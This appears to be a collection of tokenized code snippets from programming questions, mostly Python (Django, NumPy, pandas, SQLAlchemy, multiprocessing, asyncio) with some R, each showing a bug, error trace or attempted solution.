__drop_db ( service , project , **target ) __wait_for ( `` Drop '' , operation , service , project ) print ( f '' Creating database { target [ 'instance ' ] } : { target [ 'db ' ] } ... '' ) operation = __create_db ( service , project , **target ) __wait_for ( `` Creation '' , operation , service , project ) print ( f '' Importing data into { target [ 'instance ' ] } : { target [ 'db ' ] } ... '' ) operation = __import_target_db ( service , project , timestamp , **target ) __wait_for ( `` Import '' , operation , service , project ) print ( `` Deleting exported SQL file '' ) __delete_sql_file ( __sql_file_name ( source [ `` db '' ] , timestamp ) ) print ( `` Done . '' ) Error : function crashed . Details : < HttpError 403 when requesting https : //www.googleapis.com/sql/v1beta4/projects/ < project_id > /instances/ < instance_id > /import ? alt=json returned `` The service account does not have the required permissions for the bucket . `` >"
"{ `` AWSEBDockerrunVersion '' : `` 1 '' , `` Authentication '' : { `` Bucket '' : `` dockerkey '' , `` Key '' : `` mydockercfg '' } , `` Image '' : { `` Name '' : `` comp/app : { { version } } '' , `` Update '' : `` true '' } , `` Ports '' : [ { `` ContainerPort '' : `` 80 '' } ] }"
"class Foo ( models.Model ) : attr1 = models.IntegerField ( ) attr2 = models.IntegerField ( ) class Meta : unique_together = ( ( 'attr1 ' , 'attr2 ' ) , ) class Bar ( Foo ) : attr3 = models.IntegerField ( ) class Meta : unique_together = ( ( 'attr1 ' , 'attr3 ' ) , ) Unhandled exception in thread started by < bound method Command.inner_run of < django.contrib.staticfiles.management.commands.runserver.Command object at 0x10f85a0d0 > > Traceback ( most recent call last ) : File `` /Users/intelliadmin/VirtualEnvs/virtenv9/lib/python2.7/site-packages/django/core/management/commands/runserver.py '' , line 91 , in inner_run self.validate ( display_num_errors=True ) File `` /Users/intelliadmin/VirtualEnvs/virtenv9/lib/python2.7/site-packages/django/core/management/base.py '' , line 270 , in validate raise CommandError ( `` One or more models did not validate : \n % s '' % error_text ) django.core.management.base.CommandError : One or more models did not validate : app.Bar : `` unique_together '' refers to attr1 . This is not in the same model as the unique_together statement ."
E.BODY ( E.TABLE ( for row_num in range ( len ( ws.rows ) ) : row = ws.rows [ row_num ] # create a tr tag E.TR ( for cell_num in range ( len ( row ) ) : cell = row [ cell_num ] for row_num in range ( len ( ws.rows ) ) : ^ SyntaxError : invalid syntax
"**current_state next_state count**New Profile Initiated 37715Profile Initiated End 36411JobRecommended End 6202New End 6171ProfileCreated JobRecommended 5799Profile Initiated ProfileCreated 4360New NotOpted 3751NotOpted Profile Initiated 2817JobRecommended InterestedInJob 2542IntentDetected ProfileCreated 2334ProfileCreated IntentDetected 1839InterestedInJob Applied 1671JobRecommended NotInterestedInJob 1477NotInterestedInJob ProfileCreated 1408IntentDetected End 1325NotOpted End 1009InterestedInJob ProfileCreated 975Applied IntentDetected 912NotInterestedInJob IntentDetected 720Applied ProfileCreated 701InterestedInJob End 673 df = pd.read_csv ( 'input.csv ' ) x = list ( set ( df.current_state.values ) | set ( df.next_state ) ) di = dict ( ) count = 0 for i in x : di [ i ] = count count += 1 # df [ 'source ' ] = df [ 'current_state ' ] .apply ( lambda y : di [ y ] ) df [ 'target ' ] = df [ 'next_state ' ] .apply ( lambda y : di [ y ] ) # fig = go.Figure ( data= [ go.Sankey ( node = dict ( pad = 15 , thickness = 20 , line = dict ( color = `` black '' , width = 0.5 ) , label = x , color = `` blue '' ) , link = dict ( source = df.source , target = df.target , value = df [ 'count ' ] ) ) ] ) # fig.update_layout ( title_text= '' Sankey Diagram '' , font_size=10 , autosize=False , width=1000 , height=1000 , margin=go.layout.Margin ( l=50 , r=50 , b=100 , t=100 , pad=4 ) ) fig.show ( )"
"int getBuff ( unsigned char **buf , int *len ) ; data = bytes ( bytearray ( ctypes.cast ( buf , ctypes.POINTER ( ctypes.c_ubyte*len.value ) ) [ 0 ] ) )"
"from nose.tools import assert_raisesdef add ( x , y ) : return x + yassert_raises ( TypeError , add , 2 , `` 0 '' ) from nose2 import assert_raisesfrom nose2 import assertRaisesfrom nose2.tools import assert_raisesfrom nose2.tools import assertRaises"
"X < - cbind ( 1 , poly ( x = x , degree = 9 ) ) def get_hermite_poly ( x , degree ) : # scipy.special.hermite ( ) N , = x.shape # # X = np.zeros ( ( N , degree+1 ) ) for n in range ( N ) : for deg in range ( degree+1 ) : X [ n , deg ] = hermite ( n=deg , z=float ( x [ deg ] ) ) return X set.seed ( 1234 ) N < - 10x < - seq ( from = 0 , to = 1 , length = N ) mu < - sin ( 2 * pi * x * 4 ) y < - muplot ( x , y ) X < - cbind ( 1 , poly ( x = x , degree = 9 ) ) # X < - sapply ( 0:9 , function ( i ) x^i ) w < - rnorm ( 10 ) learning_rate < - function ( t ) .1 / t^ ( .6 ) n_samp < - 2for ( t in 1:100000 ) { mu_hat < - X % * % w idx < - sample ( 1 : N , n_samp ) X_batch < - X [ idx , ] y_batch < - y [ idx ] score_vec < - t ( X_batch ) % * % ( y_batch - X_batch % * % w ) change < - score_vec * learning_rate ( t ) w < - w + change } plot ( mu_hat , ylim = c ( -1 , 1 ) ) lines ( mu ) fit_exact < - predict ( lm ( y ~ X - 1 ) ) lines ( fit_exact , col = 'red ' ) abs ( w - coef ( lm ( y ~ X - 1 ) ) )"
import argparseif __name__ == `` __main__ '' : mainparser = argparse.ArgumentParser ( ) submainadder = mainparser.add_subparsers ( title='subcommands ' ) parser_ut = submainadder.add_parser ( 'unittest ' ) stuff = mainparser.parse_args ( ) # if 'unittest ' was selected : # do_things ( )
def f ( ) : raise Exceptionx = f ( )
virtualenv -p python environvirtualenv -p jython environ
"@ parsleyfyclass AccountForm ( forms.ModelForm ) : def save ( self , *args , **kwargs ) : # some other code ... return super ( AccountForm , self ) .save ( *args , **kwargs ) maximum recursion depth exceeded while calling a Python object return super ( AccountForm , self ) .save ( *args , **kwargs ) def parsleyfy ( klass ) : class ParsleyClass ( klass ) : # some code here to add more stuff to the class return ParsleyClass"
class Question ( models.Model ) : pub_date = models.DateTimeField ( 'date published ' )
"import numpy as npfrom numpy import genfromtxtfrom scipy.sparse import coo_matrixfrom scipy.sparse import csr_matrixfrom scipy.stats.stats import pearsonrimport sklearn.metrics.pairwiseimport scipy.spatial.distance as dsimport scipy.sparse as sp # read the datamy_data = genfromtxt ( 'file.csv ' , delimiter= ' , ' ) i , j , value=my_data.T # create a sparse matrixm=coo_matrix ( ( value , ( i , j ) ) ) # convert in a numpy arraym = np.array ( m.todense ( ) ) # create the distance matrix using pdistd = ds.pdist ( m.T , 'correlation ' ) d= ds.squareform ( d ) import subprocesscat = subprocess.Popen ( [ `` hadoop '' , `` fs '' , `` -cat '' , `` data.csv '' ] , stdout=subprocess.PIPE ) for line in cat.stdout : ... ."
"class SourceAddressAdapter ( HTTPAdapter ) : def __init__ ( self , source_address , **kwargs ) : self.source_address = source_address super ( SourceAddressAdapter , self ) .__init__ ( **kwargs ) def init_poolmanager ( self , connections , maxsize , block=False ) : self.poolmanager = PoolManager ( num_pools=connections , maxsize=maxsize , block=block , source_address=self.source_address ) r = requests.Session ( ) r.mount ( 'http : // ' , SourceAddressAdapter ( ( self.ip,0 ) ) ) r.mount ( 'https : // ' , SourceAddressAdapter ( ( self.ip,0 ) ) ) session = pickle.dumps ( r ) redis.hset ( 'sessions ' , id , session ) s=redis.hget ( 'sessions ' , id ) pickle.loads ( s ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/lib/python2.7/pickle.py '' , line 1382 , in loads return Unpickler ( file ) .load ( ) File `` /usr/lib/python2.7/pickle.py '' , line 858 , in load dispatch [ key ] ( self ) File `` /usr/lib/python2.7/pickle.py '' , line 1217 , in load_build setstate ( state ) File `` /usr/local/lib/python2.7/dist-packages/requests/adapters.py '' , line 114 , in __setstate__ block=self._pool_block ) File `` network_driver.py '' , line 158 , in init_poolmanager source_address=self.source_address ) AttributeError : 'SourceAddressAdapter ' object has no attribute 'source_address ' def __getstate__ ( self ) : # it calls HTTPAdapter 's __getstate__ ( ) state = super ( SourceAddressAdapter , self ) .__getstate__ ( ) state [ 'source_address ' ] = self.source_address return statedef __setstate__ ( self , state ) : self.source_address = state [ 'source_address ' ] # Call HTTPAdapter 's __setstate__ function to pack the attributes in parent class super ( SourceAddressAdapter , self ) .__setstate__ ( state )"
"class FunctionFaker ( object ) : def __init__ ( self , f ) : self.f= f def empty_function ( self ) : pass def __call__ ( self , *args , **kwargs ) : self.f ( *args , **kwargs ) def fakefunction ( f ) : `` ' a decorator that transforms a function into a FunctionFaker '' ' return FunctionFaker ( f ) @ fakefunctiondef dosomething ( ) : passdosomething.empty_function ( ) dosomething ( ) class Test ( object ) : @ fakefunction def dosomething ( self ) : passt=Test ( ) t.dosomething.empty_function ( ) t.dosomething ( )"
"import asyncioasync def compute_sum ( x , y ) : print ( `` Compute % s + % s ... '' % ( x , y ) ) await asyncio.sleep ( 5 ) print ( `` Returning sum '' ) return x + yasync def compute_product ( x , y ) : print ( `` Compute % s x % s ... '' % ( x , y ) ) print ( `` Returning product '' ) return x * yasync def print_computation ( x , y ) : result_sum = await compute_sum ( x , y ) result_product = await compute_product ( x , y ) print ( `` % s + % s = % s '' % ( x , y , result_sum ) ) print ( `` % s * % s = % s '' % ( x , y , result_product ) ) loop = asyncio.get_event_loop ( ) loop.run_until_complete ( print_computation ( 1 , 2 ) ) Compute 1 + 2 ... Returning sumCompute 1 x 2 ... Returning product1 + 2 = 31 * 2 = 2 Compute 1 + 2 ... Compute 1 x 2 ... Returning productReturning sum1 + 2 = 31 * 2 = 2"
"import itertools as itimport multiprocessingdef func ( x , val , lock ) : for i in range ( x ) : i ** 2 with lock : val.value += 1 print ( 'counter incremented to : ' , val.value ) if __name__ == '__main__ ' : v = multiprocessing.Value ( ' i ' , 0 ) lock = multiprocessing.Lock ( ) with multiprocessing.Pool ( ) as pool : pool.starmap ( func , ( ( i , v , lock ) for i in range ( 25 ) ) ) print ( counter.value ( ) ) if __name__ == '__main__ ' : v = multiprocessing.Value ( ' i ' , 0 ) lock = multiprocessing.Lock ( ) procs = [ multiprocessing.Process ( target=func , args= ( i , v , lock ) ) for i in range ( 25 ) ] for p in procs : p.start ( ) for p in procs : p.join ( ) def func ( x ) : for i in range ( x ) : i ** 2 with lock : v.value += 1 print ( 'counter incremented to : ' , v.value ) v = Nonelock = Nonedef set_global_counter_and_lock ( ) : `` '' '' Egh ... `` '' '' global v , lock if not any ( ( v , lock ) ) : v = multiprocessing.Value ( ' i ' , 0 ) lock = multiprocessing.Lock ( ) if __name__ == '__main__ ' : # Each worker process will call ` initializer ( ) ` when it starts . with multiprocessing.Pool ( initializer=set_global_counter_and_lock ) as pool : pool.map ( func , range ( 25 ) )"
"word = [ ' W ' , ' I ' , ' N ' , ' E ' ] for idx , phon in enumerate ( word ) : phon_seq = `` '' for p_len in range ( 3 ) : if idx-p_len > = 0 : phon_seq = `` `` .join ( word [ idx- ( p_len ) : idx+1 ] ) print ( phon_seq ) WIW INI NW I NEN EI N E"
"import pandas as pdimport numpy as npfrom datetime import datetime , timedelta , dateimport timeimport matplotlib.pyplot as pltdf2 = pd.DataFrame ( { ' A ' : np.random.rand ( 1440 ) .cumsum ( ) } , index = pd.date_range ( ' 1/1/2015 ' , periods=1440 , freq='1min ' ) ) df2.A.plot ( )"
"def method_name ( with , parameters ) : someVar = something ( ) ... def method_name ( with , parameters ) : `` '' '' The doc string `` '' '' ..."
"def file_upload_path ( instance , filename ) : path = os.path.join ( 'uploaded_files ' , str ( uuid4 ( ) ) ) return path class UploadedFile ( models.Model ) : file_object = models.FileField ( null=False , blank=False , upload_to=file_upload_path ) def __unicode__ ( self ) : return self.file_object.name class UploadFileForm ( forms.ModelForm ) : class Meta : model = UploadedFile fields = [ 'file_object ' ] def home ( request ) : ... if form.is_valid ( ) : new_file = form.save ( commit=True ) print new_file ... def home ( request ) : ... if form.is_valid ( ) : new_file = form.save ( commit=False ) print new_file # new_file_object = FileObject ( os.path.abspath ( new_file.file_object.url ) ) # new_file.mime_type = new_file_object.get_mime_type ( ) ... def save ( self , commit=True , *args , **kwargs ) : new_model = super ( UploadFileForm , self ) .save ( commit=False ) file_object = self.cleaned_data [ 'file_object ' ] file_info = FileObject ( file_object ) new_model.mime_type = file_info.get_mime_type ( ) new_model.sha256 = file_info.get_sha256 ( ) new_model.md5 = file_info.get_md5 ( ) if commit : new_model.save ( ) return new_model"
"self.assertRaises ( IntegrityError , db.session.commit ( ) )"
"C : \Users\Henry > python -m timeit -s `` mul = int.__mul__ '' `` reduce ( mul , range ( 10000 ) ) '' 1000 loops , best of 3 : 908 usec per loopC : \Users\Henry > python -m timeit -s `` from operator import mul '' `` reduce ( mul , range ( 10000 ) ) '' 1000 loops , best of 3 : 410 usec per loop C : \Users\Henry > pythonPython 2.7.4 ( default , Apr 6 2013 , 19:55:15 ) [ MSC v.1500 64 bit ( AMD64 ) ] on win32Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > mul = int.__mul__ > > > def test ( ) : ... mul ( 1,2 ) ... > > > import dis > > > dis.dis ( test ) 2 0 LOAD_GLOBAL 0 ( mul ) 3 LOAD_CONST 1 ( 1 ) 6 LOAD_CONST 2 ( 2 ) 9 CALL_FUNCTION 2 12 POP_TOP 13 LOAD_CONST 0 ( None ) 16 RETURN_VALUE > > > C : \Users\Henry > pythonPython 2.7.4 ( default , Apr 6 2013 , 19:55:15 ) [ MSC v.1500 64 bit ( AMD64 ) ] on win32Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from operator import mul > > > def test ( ) : ... mul ( 1,2 ) ... > > > import dis > > > dis.dis ( test ) 2 0 LOAD_GLOBAL 0 ( mul ) 3 LOAD_CONST 1 ( 1 ) 6 LOAD_CONST 2 ( 2 ) 9 CALL_FUNCTION 2 12 POP_TOP 13 LOAD_CONST 0 ( None ) 16 RETURN_VALUE > > > $ python3 -m timeit -s 'mul=int.__mul__ ; from functools import reduce ' 'reduce ( mul , range ( 10000 ) ) '1000 loops , best of 3 : 1.18 msec per loop $ python3 -m timeit -s 'from operator import mul ; from functools import reduce ' 'reduce ( mul , range ( 10000 ) ) '1000 loops , best of 3 : 643 usec per loop $ python3 -m timeit -s 'mul=lambda x , y : x*y ; from functools import reduce ' 'reduce ( mul , range ( 10000 ) ) '1000 loops , best of 3 : 1.26 msec per loop"
"lookupValue = somedict.get ( someKey , someDefaultValue ) var lookupValue ; if ( ! somedict.TryGetValue ( someKey , lookupValue ) ) lookupValue = someDefaultValue ; var lookupValue = someDefaultValue ; if ( someKey ! = null & & ! somedict.TryGetValue ( someKey , lookupValue ) ) lookupValue = someDefaultValue ;"
rm /tmp/my_silly_directory/* r = envoy.run ( 'rm /tmp/my_silly_directory/* ' ) r.std_err - > `` rm : can not remove ` /tmp/my_silly_directory/* ' : No such file or directory ''
"SQLAlchemy v1.0.6 cx_Oracle v5.2 class Database : def __init__ ( self , service_name , database , username , password ) : `` '' '' service_name ( str ) : The service name as defined in tnsnames.ora . database ( str ) : The database within the chosen service. `` '' '' self.engine = create_engine ( r'oracle+cx_oracle : // { username } : { password } @ { service_name } '.format ( username=username , password=password , service_name=service_name ) , case_sensitive=False ) self.session_maker = sessionmaker ( bind=self.engine , autoflush=False , autocommit=False ) # Database name must be injected into every table definition ; this is why tables must be procedurally generated . self.Base = declarative_base ( ) # base class for all database tables self.build_tables ( database ) def make_session ( self ) : `` '' '' Create a read-only session for the database . '' '' '' def readonly_abort ( ) : raise Exception ( 'writing is prohibited ; db is read-only ' ) session = self.session_maker ( ) session.flush = readonly_abort return session def build_tables ( self , database ) : class Lot ( self.Base ) : __tablename__ = 'lot ' __table_args__ = { 'schema ' : database } lot_key = Column ( Integer , primary_key=True ) lot_id = Column ( String , name='lot_id ' ) self.lot = Lot def sqlalchemy_test ( ) : db = dp_orm.Database ( service_name , database ) session = db.make_session ( ) cursor = session.query ( db.lot ) results = cursor.first ( ) if results is None : raise Exceptiondef cx_oracle_test ( ) : import cx_Oracle import set_environment_variables conn = cx_Oracle.Connection ( username , password , service_name ) cursor = conn.cursor ( ) c = cursor.execute ( 'SELECT * FROM { } .lot WHERE rownum < = 1'.format ( database ) ) results = list ( c ) if len ( results ) ! = 1 : raise Exception from sqlalchemy import create_engine , Column , Integer , Stringfrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import sessionmaker # Fix environment variablesimport ostry : del os.environ [ 'ORACLE_HOME ' ] except KeyError : passos.environ [ 'TNS_ADMIN ' ] = r ' C : \product\11.1.0\client_1\network\admin'os.environ [ 'PATH ' ] = r ' C : \product\11.1.0\client_1\BIN ; ' + os.environ [ 'PATH ' ] engine = create_engine ( r'oracle+cx_oracle : // { username } : { password } @ { service_name } '.format ( username='USER ' , password='PASSWORD ' , service_name='SERVICE ' ) ) session_maker = sessionmaker ( bind=engine ) base_class = declarative_base ( ) class Lot ( base_class ) : __tablename__ = 'lot ' __table_args__ = { 'schema ' : 'SCHEMA_NAME ' } lot_key = Column ( Integer , primary_key=True ) lot_id = Column ( String ) session = session_maker ( ) cursor = session.query ( Lot ) result = cursor.first ( ) if result is None : raise Exception"
"class Mock ( object ) : def __init__ ( self , *args , **kwargs ) : pass def __call__ ( self , *args , **kwargs ) : return Mock ( ) @ classmethod def __getattr__ ( cls , name ) : if name in ( '__file__ ' , '__path__ ' ) : return '/dev/null ' elif name [ 0 ] == name [ 0 ] .upper ( ) : return type ( name , ( ) , { } ) else : return Mock ( ) MOCK_MODULES = [ 'numpy ' , 'scipy ' , 'matplotlib ' , 'matplotlib.pyplot ' ] for mod_name in MOCK_MODULES : sys.modules [ mod_name ] = Mock ( )"
"if type ( A ) == int : do_something ( A ) else : do_something ( int ( A ) ) try : do_something ( A ) except TypeError : do_something ( int ( A ) ) return float ( A ) % 20 # coerse A to a float so it 'll only fail if we actually do n't # have anything that can be represented as a real number . if isinstance ( A , Number ) : # This is cheaper because we 're not creating a new return A % 20 # object unless we really have to.else : return float ( A ) % 20 try : # Now we 're doing any logical tests in the 99 % of cases where A is a number return A % 20except TypeError : return float ( A ) % 20"
"from __future__ import print_functionclass myfile ( file ) : def __exit__ ( self , *excinfo ) : print ( `` __exit__ called '' ) super ( myfile , self ) .__exit__ ( *excinfo ) def my_generator ( file_name ) : with myfile ( file_name ) as fh : for line in fh : yield line.strip ( ) gen = my_generator ( 'file.txt ' ) print ( next ( gen ) ) print ( `` Before del '' ) del genprint ( `` After del '' ) Line 1 from fileBefore del__exit__ calledAfter del"
"a = np.random.random ( ( 3,3 ) ) # array ( [ [ 0.4986962 , 0.65777899 , 0.16798398 ] , # [ 0.02767355 , 0.49157946 , 0.03178513 ] , # [ 0.60765513 , 0.65030948 , 0.14786596 ] ] ) a [ 0 , : ] # array ( [ 0.4986962 , 0.65777899 , 0.16798398 ] ) a [ 0:1 , : ] # ora [ 0 , : ] [ np.newaxis , : ] # array ( [ [ 0.4986962 , 0.65777899 , 0.16798398 ] ] ) np.minndim ( a , ndim=2 )"
"import numpy as npfrom random import randintimport matplotlib.pyplot as pltfrom scipy.spatial import Voronoi , voronoi_plot_2dNUM_OF_POINTS = 20points = [ ] for i in range ( 0 , NUM_OF_POINTS ) : points.append ( [ randint ( 0 , 500 ) , randint ( 0 , 500 ) ] ) points = np.array ( points ) vor = Voronoi ( points ) voronoi_plot_2d ( vor ) plt.show ( )"
"combo [ 0 ] = [ b [ 0 ] , b [ 1 ] , b [ 2 ] , b [ 3 ] ] combo [ 1 ] = [ b [ 0 ] , b [ 1 ] , b [ 2 ] , b [ 4 ] ] b [ 3 ] .r = 1b [ 3 ] .p = 3b [ 3 ] .c = 2"
"G= nx.Graph ( ) G.add_path ( [ 1 , 2,4 ] ) G.add_path ( [ 1 , 3,4 ] ) G [ 1 ] [ 2 ] [ 'weight ' ] = 20G [ 1 ] [ 3 ] [ 'weight ' ] = 1G [ 2 ] [ 4 ] [ 'weight ' ] = 1G [ 3 ] [ 4 ] [ 'weight ' ] = 1for u , v , d in G.edges ( data=True ) : if 'weight ' in d : if d [ 'weight ' ] ! = 0 : d [ 'reciprocal ' ] = 1/d [ 'weight ' ] b = nx.betweenness_centrality ( G , weight= 'reciprocal ' , normalized=False ) Out [ 46 ] : { 1 : 1.0 , 2 : 1.0 , 3 : 0.0 , 4 : 0.0 } f = nx.current_flow_betweenness_centrality ( G , normalized= False , weight= 'weight ' , solver='lu ' ) Out [ 48 ] : { 1 : 1.3114754098360655 , 2 : 1.3114754098360657 , 3 : 0.6885245901639343 , 4 : 0.6885245901639347 }"
"myproject/└── tests ├── data │ └── input.json ├── trialTest.py import unittestimport inspectimport pkg_resourcesclass Test ( unittest.TestCase ) : def test_01_pathTest ( self ) : dataDirExists = pkg_resources.resource_exists ( inspect.getmodule ( self ) .__name__ , 'data ' ) print 'data exists : % s ' % ( dataDirExists ) if __name__ == '__main__ ' : unittest.main ( ) cd myprojectpython tests/trialTest.pydata exists : True. -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 0.000sOK cd myproject/usr/local/bin/trial tests/trialTest.pytrialTest Test test_01_pathTest ... data exists : False [ OK ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -Ran 1 tests in 0.013sPASSED ( successes=1 )"
"ImportError : No module named wagtailunable to load app 0 ( mountpoint= '' ) ( callable not found or import error ) /usr/local/lib/python2.7/dist-packages/ /opt/django/src/ ImportError at / can not import name pages Request Method : GETRequest URL : http : //example.comDjango Version : 1.9Exception Type : ImportErrorException Value : can not import name pagesException Location : ./wagtail/wagtailadmin/urls/__init__.py in < module > , line 4Python Executable : /usr/local/bin/uwsgiPython Version : 2.7.3Python Path : [ ' . ' , `` , '/opt/django/src ' , '/root/.python ' , '/opt/django/env/lib/python2.7 ' , '/opt/django/env/lib/python2.7/plat-linux2 ' , '/opt/django/env/lib/python2.7/lib-tk ' , '/opt/django/env/lib/python2.7/lib-old ' , '/opt/django/env/lib/python2.7/lib-dynload ' , '/usr/lib/python2.7 ' , '/usr/lib/python2.7/plat-linux2 ' , '/usr/lib/python2.7/lib-tk ' , '/opt/django/env/local/lib/python2.7/site-packages ' , '/opt/django/env/lib/python2.7/site-packages ' ] from django.conf.urls import url , includefrom django.views.decorators.cache import cache_controlfrom wagtail.wagtailadmin.urls import pages as wagtailadmin_pages_urlsfrom wagtail.wagtailadmin.urls import collections as wagtailadmin_collections_urlsfrom wagtail.wagtailadmin.urls import password_reset as wagtailadmin_password_reset_urlsfrom wagtail.wagtailadmin.views import account , chooser , home , pages , tags , userbarfrom wagtail.wagtailadmin.api import urls as api_urlsfrom wagtail.wagtailcore import hooksfrom wagtail.utils.urlpatterns import decorate_urlpatternsfrom wagtail.wagtailadmin.decorators import require_admin_access"
"class getLineups ( webapp2.RequestHandler ) : def post ( self ) : jsonstring = self.request.body inputData = json.loads ( jsonstring ) playerList = inputData [ `` pList '' ] positions = [ `` QB '' , '' RB '' , '' WR '' , '' TE '' , '' DST '' ] playersPos = sortByPos ( playerList , positions ) rosters , playerUse = getNFLRosters ( playersPos , positions ) try : # This step is computationally expensive , it will fail on large player lists . lineups = makeLineups ( rosters , playerUse,50000 ) self.response.headers [ `` Content-Type '' ] = `` application/json '' self.response.out.write ( json.dumps ( lineups ) ) except : logging.error ( `` 60 second timeout reached on player list of length : '' , len ( playerList ) ) self.response.headers [ `` Content-Type '' ] = `` text/plain '' self.response.set_status ( 504 ) app = webapp2.WSGIApplication ( [ ( '/lineup ' , getLineups ) , ] , debug = True ) deferred.defer ( makeLineups , rosters , playerUse,50000 ) def solveResult ( result_key ) : result = result_key.get ( ) playersPos = sortByPos ( result.playerList , result.positions ) rosters , playerUse = getNFLRosters ( playersPos , result.positions ) lineups = makeLineups ( rosters , playerUse,50000 ) storeResult ( result_key , lineups ) @ ndb.transactionaldef storeResult ( result_key , lineups ) : result = result_key.get ( ) result.lineups = lineups result.solveComplete = True result.put ( ) class Result ( ndb.Model ) : playerList = ndb.JsonProperty ( ) positions = ndb.JsonProperty ( ) solveComplete = ndb.BooleanProperty ( ) class getLineups ( webapp2.RequestHandler ) : def post ( self ) : jsonstring = self.request.body inputData = json.loads ( jsonstring ) deferredResult = Result ( playerList = inputData [ `` pList '' ] , positions = [ `` QB '' , '' RB '' , '' WR '' , '' TE '' , '' DST '' ] , solveComplete = False ) deferredResult_key = deferredResult.put ( ) deferred.defer ( solveResult , deferredResult_key ) self.response.headers [ `` Content-Type '' ] = `` text/plain '' self.response.out.write ( deferredResult_key.urlsafe ( ) ) class queryResults ( webapp2.RequestHandler ) : def post ( self ) : safe_result_key = self.request.body result_key = ndb.Key ( urlsafe=safe_result_key ) result = result_key.get ( ) self.response.headers [ `` Content-Type '' ] = `` application/json '' if result.solveComplete : self.response.out.write ( json.dumps ( result.lineups ) ) else : self.response.out.write ( json.dumps ( [ ] ) )"
"> > > this = np.arange ( 10 ) > > > this [ ~ ( this > =5 ) ] .max ( ) 4 > > > that = T.arange ( 10 , dtype='int32 ' ) > > > that [ ~ ( that > =5 ) ] .max ( ) .eval ( ) 9 > > > that [ ~ ( that > =5 ) .nonzero ( ) ] .max ( ) .eval ( ) Traceback ( most recent call last ) : File `` < pyshell # 146 > '' , line 1 , in < module > that [ ~ ( that > =5 ) .nonzero ( ) ] .max ( ) .eval ( ) AttributeError : 'TensorVariable ' object has no attribute 'nonzero '"
[ ] is [ ]
"# renaming a columncolnames ( mydataframe ) [ 1 ] < - `` new_column_name '' # renaming a columnlibrary ( data.table ) setnames ( mydatatable , 'old_column_name ' , 'new_column_name ' ) mydataframe.rename ( columns = { 'old_column_name ' : 'new_column_name ' } , inplace=True )"
"# Functiondef recursive_factor_test ( x , n ) : if n==1 : return True else : if x % n == 0 : # print `` passed { } '' .format ( n ) recursive_factor_test ( x , n-1 ) else : return False # Example Expecting Falseprint recursive_factor_test ( 5041,7 ) > > False # Example Expecting Trueprint recursive_factor_test ( 5040,7 ) > > Nonetype ( recursive_factor_test ( 5040,7 ) ) > > NoneType"
repositories { pyGradlePyPi ( ) }
"def sub_set ( A ) : if A == [ ] : return A X = sub_set ( A [ 1 : ] ) result = [ ] for L in X : result += _____ return _____ print ( sub_set ( [ 1 , 2 ] ) ) # [ [ ] , [ 1 ] , [ 2 ] , [ 1 , 2 ] ] print ( sub_set ( [ 1 , 2 , 3 ] ) ) # [ [ ] , [ 1 ] , [ 2 ] , [ 1 , 2 ] , [ 3 ] , [ 1 , 3 ] , [ 2 , 3 ] , [ 1 , 2 , 3 ] ] def sub_set ( A ) : if A == [ ] : return A X = sub_set ( A [ 1 : ] ) result = [ ] for L in X : result += _____ return result + [ A [ :1 ] ] + [ A ] + [ A [ : :2 ] ] # sub_set ( [ 1 , 2 , 3 ] ) - > [ [ 3 ] , [ 3 ] , [ 3 ] , [ 2 ] , [ 2 , 3 ] , [ 2 ] , [ 1 ] , [ 1 , 2 , 3 ] , [ 1 , 3 ] ]"
"class Simple ( Layer ) : def __init__ ( self , output_dim , **kwargs ) : self.output_dim = output_dim super ( Simple , self ) .__init__ ( **kwargs ) def build ( self ) : self.kernel = self.add_weight ( name='kernel ' , shape=self.output_dim , initializer='uniform ' , trainable=True ) super ( Simple , self ) .build ( ) def call ( self ) : return self.kernel def compute_output_shape ( self ) : return self.output_dimX = Simple ( ( 1 , 784 ) ) ( )"
"l = [ ' 1 ' , ' 2 ' , ' 3 ' ] goal = [ ' < li > 1 < /li > ' , ' < li > 2 < /li > ' ]"
Measure-Command { start-process python .\script.py -Wait } Measure-Command { start-process python .\script.py file.txt 100 -Wait }
"> > > df_a sales cogsSTK_ID QT 000876 1 100 100 2 100 100 3 100 100 4 100 100 5 100 100 6 100 100 7 100 100 > > > df_b sales cogsSTK_ID QT 000876 5 50 50 6 50 50 7 50 50 8 50 50 9 50 50 10 50 50 > > > df_c = patch ( df_a , df_b ) sales cogsSTK_ID QT 000876 1 100 100 2 100 100 3 100 100 4 100 100 5 50 50 6 50 50 7 50 50 8 50 50 9 50 50 10 50 50"
"In [ 1 ] : import numpy as npIn [ 2 ] : A = np.array ( [ 1,2,3 ] ) In [ 3 ] : B = np.random.rand ( 3,3 ) ; BOut [ 3 ] : array ( [ [ 0.67402953 , 0.45017072 , 0.24324747 ] , [ 0.40559793 , 0.79007712 , 0.94247771 ] , [ 0.47477422 , 0.27599007 , 0.13941255 ] ] ) In [ 4 ] : # desired output : In [ 5 ] : A [ : :-1 ] Out [ 5 ] : array ( [ 3 , 2 , 1 ] ) In [ 6 ] : B [ : :-1 , : : -1 ] Out [ 6 ] : array ( [ [ 0.13941255 , 0.27599007 , 0.47477422 ] , [ 0.94247771 , 0.79007712 , 0.40559793 ] , [ 0.24324747 , 0.45017072 , 0.67402953 ] ] )"
"y = [ 3 , `` a '' ] x = [ 5 , `` b '' ] z = [ `` b '' , 5 ]"
